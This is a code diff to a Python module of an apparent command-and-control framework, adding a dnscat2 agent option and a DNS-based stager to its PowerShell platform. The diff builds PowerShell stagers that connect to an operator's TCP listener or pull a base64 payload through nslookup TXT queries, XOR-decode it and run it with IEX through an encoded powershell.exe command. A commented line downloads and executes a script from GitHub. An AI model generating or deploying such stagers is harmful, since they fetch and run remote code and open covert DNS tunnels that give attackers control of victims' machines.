@@ -51,7 +51,13 @@ class PlatformPowershell(Platform, ModuleBase):
                 'Description'   :   'File path of a PEM with both RSA key and certificate to sign and verify staged agent with (you can generate a selfsigned cert by using the script gencert.sh initially)',
                 'Required'      :   False,
                 'Value'         :   "$TOOLPATH/data/syssspy.pem"
-            }
+            },
+            'AGENTTYPE': {
+                'Description'   :   'Defines which agent should be used (the default syssspy agent for this plattform, or some third party software we support)',
+                'Required'      :   True,
+                'Value'         :   "DEFAULT",
+                'Options'       :   ("DEFAULT", "DNSCAT2")
+            },
         }
         self.handler = handler
         self.platformpath = os.path.abspath(os.path.dirname(__file__))
@@ -165,12 +171,17 @@ class PlatformPowershell(Platform, ModuleBase):
         valid = ModuleBase.validate_options(self)
 
         # do we need STAGECERTIFICATEFILE and is it valid?
-        if self.options['STAGED']['Value'] == "TRUE" and self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
+        if self.options['STAGED']['Value'] == "TRUE" and (self.options['STAGEENCODING']['Value'] == "TRUE"
+                or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE") or self.options['AGENTTYPE']['Value'] == "DNSCAT2":
             if not self.options['STAGECERTIFICATEFILE']['Value'] or self.options['STAGECERTIFICATEFILE']['Value'] == "":
-                print_error("STAGECERTIFICATEFILE must be set when using STAGEENCODING and/or STAGEAUTHENTICATION")
+                print_error("STAGECERTIFICATEFILE must be set when using STAGEENCODING and/or STAGEAUTHENTICATION and/or DNSCAT2")
                 valid = False
             elif not self._validate_certificatefile("STAGECERTIFICATEFILE",self.options['STAGECERTIFICATEFILE']['Value']):
                 valid = False
+
+        if self.options['AGENTTYPE']['Value'] == "DNSCAT" and self.handler.options['TRANSPORT']['VALUE'] != "DNS":
+            print_error("dnscat2 must be used with DNS transport, hence the name!")
+            valid = False
 
         return valid
 
@@ -201,67 +212,191 @@ class PlatformPowershell(Platform, ModuleBase):
                 return None
             port = self.handler.transport.options['CONNECTPORT']['Value'] or self.handler.transport.options['LPORT']['Value']
             print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))
+
             # TODO: Consider using helps.randomize_capitalization(...)
-            stager = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip,port)
+            stager  = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip,port)
             stager += '$a=New-Object char[]({});'.format(MAX_AGENT_LEN)
             stager += '$r=New-Object IO.StreamReader($c.GetStream());'
             stager += '$b=0;'
             stager += 'while($b -lt {}){{$b+=$r.Read($a,$b,{}-$b)}};'.format(MIN_AGENT_LEN, MAX_AGENT_LEN)
 
-            # include fingerprint only if needed for STAGEENCODING and/or STAGEAUTHENTICATION
-            if self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
-                self._initkeycertificate()
-                stager += '$fp="{}";'.format(self.fingerprint)
-
-            # for stage encoding, include decoding algorithm here
-            if self.options['STAGEENCODING']['Value'] == "TRUE":
-                stager += '$i=0;$a=$a|%{$_-bXor$fp[$i++%$fp.Length]};'
-
-            # for stage authentication, include fingerprint and verification code here
-            if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
-                self._initkeycertificate()
-
-                # split data in publickey, signature, agentcode:
-                parsepos=0 # next position to parse the array to string
-                stager += '$pk=New-Object String($a,{},{});'.format(parsepos, len(self.publickeyxml))
-                parsepos += len(self.publickeyxml)
-                stager += '$sig=New-Object String($a,{},{});'.format(parsepos,SIGNATURE_LEN_B64)
-                parsepos += SIGNATURE_LEN_B64
-                stager += '$s=New-Object String($a,{},($b-{}));'.format(parsepos,parsepos)            
-
-                # verify the public key
-                stager += '$sha=New-Object Security.Cryptography.SHA512Managed;'
-                stager += 'if(@(Compare-Object $sha.ComputeHash($pk.ToCharArray()) ([Convert]::FromBase64String($fp)) -SyncWindow 0).Length -ne 0){"ERROR1";Exit(1)};' # check fingerprint of server cert
-
-                # verify the signature of the code using the public key
-                stager += '$x=New-Object Security.Cryptography.RSACryptoServiceProvider;'
-                stager += '$x.FromXmlString($pk);'
-                stager += 'if(-Not $x.VerifyData($s.ToCharArray(),"{}",[Convert]::FromBase64String($sig))){{"ERROR2";Exit(2)}};'.format(SIGNATURE_ALGO) # check signature of agent code
-
-            # without stage authentication, no need for pk or signature yet
-            else:
-                stager += '$s=New-Object String($a,0,$b);'
-
-            # finally execute the agent
-            stager += '"GOAGENT";IEX $s;'
-            print_debug(DEBUG_MODULE, "stager = {}".format(stager))
-            return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ") # TODO: baseCmd
-
+        # generate powershell + dns stager
         elif self.handler.options['TRANSPORT']['Value'] == "DNS":
-            # TODO: implement stager for Powershell and DNS here!
-            return "NO STAGER"
+            zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
+            server = self.handler.transport.options['DNSSERVER']['Value']
+            print_debug(DEBUG_MODULE, "zone = {}, server = {}".format(zone, server))
+            if server is None:
+                server = ""
 
-        # combination platform / transport currently not supported 
+            # TODO: Consider using helps.randomize_capitalization(...)
+            stager  = '$a="";for($i=0;;$i++){'
+            stager += '$c=([string](IEX "nslookup -type=TXT s$($i).{}. {}")).Split({})[1];'.format(zone, server, "'\"'")
+            stager += 'if(!$c){break;}$a+=$c;}'
+            stager += '$a=[Convert]::FromBase64String($a);'
+            stager += '$b=$a.Length;'
+
+        # combination platform / transport currently not supported
         else:
             print_error("No stager for platform and transport found.")
             return None
 
+        # include fingerprint only if needed for STAGEENCODING and/or STAGEAUTHENTICATION and/or DNSCAT2
+        if self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE" \
+                or self.options['AGENTTYPE']['Value'] == "DNSCAT2":  # dnscat2 needs the fingerprint as a secret
+            self._initkeycertificate()
+            stager += '$fp="{}";'.format(self.fingerprint)
+
+        # for stage encoding, include decoding algorithm here
+        if self.options['STAGEENCODING']['Value'] == "TRUE":
+            stager += '$i=0;$a=$a|%{$_-bXor$fp[$i++%$fp.Length]};'
+
+        # for stage authentication, include fingerprint and verification code here
+        if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
+            self._initkeycertificate()
+
+            # split data in publickey, signature, agentcode:
+            parsepos=0 # next position to parse the array to string
+            stager += '$pk=New-Object String($a,{},{});'.format(parsepos, len(self.publickeyxml))
+            parsepos += len(self.publickeyxml)
+            stager += '$sig=New-Object String($a,{},{});'.format(parsepos,SIGNATURE_LEN_B64)
+            parsepos += SIGNATURE_LEN_B64
+            stager += '$s=New-Object String($a,{},($b-{}));'.format(parsepos,parsepos)
+
+            # verify the public key
+            stager += '$sha=New-Object Security.Cryptography.SHA512Managed;'
+            stager += 'if(@(Compare-Object $sha.ComputeHash($pk.ToCharArray()) ([Convert]::FromBase64String($fp)) ' \
+                      '-SyncWindow 0).Length -ne 0){"ERROR1";Exit(1)};'  # check fingerprint of server cert
+
+            # verify the signature of the code using the public key
+            stager += '$x=New-Object Security.Cryptography.RSACryptoServiceProvider;'
+            stager += '$x.FromXmlString($pk);'
+            stager += 'if(-Not $x.VerifyData($s.ToCharArray(),"{}",[Convert]::FromBase64String($sig)))' \
+                      '{{"ERROR2";Exit(2)}};'.format(SIGNATURE_ALGO)  # check signature of agent code
+
+        # without stage authentication, no need for pk or signature yet
+        else:
+            stager += '$s=New-Object String($a,0,$b);'
+
+        # finally execute the agent
+        stager += '"GOAGENT";IEX $s;'
+        print_debug(DEBUG_MODULE, "stager = {}".format(stager))
+        return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ") # TODO: baseCmd
+
     def getagent(self):
         """
-        Generate the full powershell agent string for this setup if possible
+        Generate the full powershell agent for this setup if possible
+        :return: encoded agent bytes
         """
 
-        print_debug(DEBUG_MODULE, "platformpath = {}".format(self.platformpath))
+        agent = ""
+
+        if self.options['AGENTTYPE']['Value'] == "DNSCAT2":
+            agent = self.getagent_dnscat2()
+
+        elif self.options['AGENTTYPE']['Value'] == "DEFAULT":
+            agent = self.getagent_default()
+
+        else:
+            print_error("AGENTTYPE is not defined")
+            return None
+
+        if agent is None:
+            print_error("Generation for the AGENTTYPE failed")
+            return None
+
+        # strip comments and empty lines
+        agent = helps.strip_powershell_comments(agent)
+
+        # ok, lets encode the agent
+        agent = agent.encode('utf-8')
+        print_debug(DEBUG_MODULE, "len(real agent) = {}".format(len(agent)))
+
+        # add spaces if the agent is too short for staging with REVERSETCP
+        if self.isstaged() and self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
+            currentreallen = len(agent)
+            if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
+                currentreallen += len(self.publickeyxml) + SIGNATURE_LEN_B64
+            if currentreallen < MIN_AGENT_LEN:
+                print_error("agent is shorter than staging read, adding some spaces")
+                agent += b' ' * (MIN_AGENT_LEN-currentreallen)
+
+        # with stage authentication: publickey + signature + agentcode
+        if self.isstaged() and self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
+            self._initkeycertificate()
+            if not self.publickeyxml:
+                print_error("Cannot sign agent, since STAGEAUTHENTICATION is active but creating the publickeyxml " +
+                            "failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
+                return None
+            else:
+                print_debug(DEBUG_MODULE, "publickey as xml = {}".format(self.publickeyxml))
+                agent = self.publickeyxml.encode('utf-8') + base64.b64encode(self._sign_data(agent)) + agent
+
+        # encode agent with fingerprint as encodingkey if active
+        if self.isstaged() and self.options['STAGEENCODING']['Value'] == "TRUE":
+            self._initkeycertificate()
+            if not self.fingerprint:
+                print_error("Cannot encode agent, since STAGEENCODING is active but creating the certificate fingerprint failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
+                return None
+            else:
+                #print_debug(DEBUG_MODULE, "agent = {}".format(agent))
+                #print_debug(DEBUG_MODULE, "fingerprint = {}".format(self.fingerprint))
+                agent = encryption.xor_encode(agent, self.fingerprint)
+
+        # check length for REVERSETCP staging
+        if len(agent) > MAX_AGENT_LEN and self.isstaged() and self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
+            print_error("agent is longer than stager buffer, staging will fail")
+
+        return agent
+
+    def getagent_dnscat2(self):
+        """
+        Return the full dnscat2-powershell agent string
+        :return: agent string
+        """
+
+        if self.handler.options["TRANSPORT"]["Value"] != "DNS":
+            print_error("dnscat2 must be used with DNS transport, hence the name!")
+            return None
+
+        # we need the fingerprint as a pre-shared secret
+        secret = None
+        if self.isstaged():  # if staged, fingerprint was already included in the stager
+            secret = "$fp"
+        else:
+            self._initkeycertificate()
+            secret = self.fingerprint
+
+        if secret is None:
+            print_error("dnscat2 needs a pre-shared secret, and we failed using the certificate fingerprint for some reason")
+            return None
+
+        # load agent from file dnscat2-powershell
+        f = open(sanatizefilename("$TOOLPATH/thirdpartytools/dnscat2-powershell/dnscat2.ps1"), 'r')
+        agent = f.read()
+        f.close()
+
+        # or if you do not want to wait for ever for testing, TODO: remove!!!
+        #agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"
+
+        zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
+        server = self.handler.transport.options['DNSSERVER']['Value']
+        print_debug(DEBUG_MODULE, "zone = {}, server = {}".format(zone, server))
+        if server is None:
+            server = ""
+        else:
+            server = " -DNSServer "+str(server)
+
+        # add execution with zone and pre shared secret
+        agent += "Start-Dnscat2 -Domain {}{} -PreSharedSecret \"{}\";".format(zone, server, secret)
+
+        return agent
+
+    def getagent_default(self):
+        """
+        return the default syssspy agent code
+        :return: agent string
+        """
+
         agent = ""
 
         # add selected transport implementation
@@ -270,25 +405,28 @@ class PlatformPowershell(Platform, ModuleBase):
 
         elif self.handler.options['TRANSPORT']['Value'] == "DNS":
             # TODO: implement agent for Powershell and DNS here!
-            return b"NO AGENT"
+            print_error("No agent module for platform and transport found.")
+            return None
 
-        # combination platform / transport currently not supported 
+        # combination platform / transport currently not supported
         else:
             print_error("No agent module for platform and transport found.")
             return None
+
         agent += f.read()
         f.close()
 
-        # add selected channel encryption method
+        # add no channel encryption method
         if self.handler.options['CHANNELENCRYPTION']['Value'] == "NONE":
-            pass # no encryption needed
+            pass  # no encryption needed
 
+        # add selected channel encryption method TLS
         elif self.handler.options['CHANNELENCRYPTION']['Value'] == "TLS":
             f = open(self.platformpath + "/transport/tls.ps1", 'r')
             agent += f.read()
             f.close()
 
-        # combination platform / channel encryption currently not supported 
+        # combination platform / channel encryption currently not supported
         else:
             print_error("No agent module for platform and channel encryption found.")
             return None
@@ -297,14 +435,11 @@ class PlatformPowershell(Platform, ModuleBase):
         f = open(self.platformpath + "/message/message.ps1", 'r')
         agent += f.read()
         f.close()
-        
+
         # add agent base code
         f = open(self.platformpath + "/agent.ps1", 'r')
         agent += f.read()
         f.close()
-
-        # strip comments and empty lines
-        agent = helps.strip_powershell_comments(agent)
 
         # get and replace some values
         if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
@@ -323,7 +458,7 @@ class PlatformPowershell(Platform, ModuleBase):
             # TODO: implement agent for Powershell and DNS here!
             return b"NO AGENT"
 
-        # combination platform / transport currently not supported 
+        # combination platform / transport currently not supported
         else:
             print_error("No agent module for platform and transport found.")
             return None
@@ -331,40 +466,4 @@ class PlatformPowershell(Platform, ModuleBase):
         # replace channel encryption property
         agent = agent.replace('SYREPLACE_CHANNELENCRYPTION', self.handler.options['CHANNELENCRYPTION']['Value'])
 
-        # ok, lets encode the agent
-        agent = agent.encode('utf-8')
-        print_debug(DEBUG_MODULE, "len(real agent) = {}".format(len(agent)))
-
-        # add spaces if the agent is too short for staging
-        if self.isstaged():
-            currentreallen = len(agent)
-            if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
-                currentreallen += len(self.publickeyxml) + SIGNATURE_LEN_B64
-            if currentreallen < MIN_AGENT_LEN:
-                print_error("agent is shorter than staging read, adding some spaces")
-                agent += b' ' * (MIN_AGENT_LEN-currentreallen)
-
-        # with stage authentication: publickey + signature + agentcode
-        if self.isstaged() and self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
-            self._initkeycertificate()
-            if not self.publickeyxml:
-                print_error("Cannot sign agent, since STAGEAUTHENTICATION is active but creating the publickeyxml failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
-                return None
-            else:
-                print_debug(DEBUG_MODULE, "publickey as xml = {}".format(self.publickeyxml))
-                agent = self.publickeyxml.encode('utf-8') + base64.b64encode(self._sign_data(agent)) + agent
-
-        # encode agent with fingerprint as encodingkey if active
-        if self.isstaged() and self.options['STAGEENCODING']['Value'] == "TRUE":
-            self._initkeycertificate()
-            if not self.fingerprint:
-                print_error("Cannot encode agent, since STAGEENCODING is active but creating the certificate fingerprint failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
-                return None
-            else:
-                #print_debug(DEBUG_MODULE, "agent = {}".format(agent))
-                #print_debug(DEBUG_MODULE, "fingerprint = {}".format(self.fingerprint))
-                agent = encryption.xor_encode(agent, self.fingerprint)
-
-        if len(agent) > MAX_AGENT_LEN and self.isstaged():
-            print_error("agent is longer than stager buffer, staging will fail")
         return agent
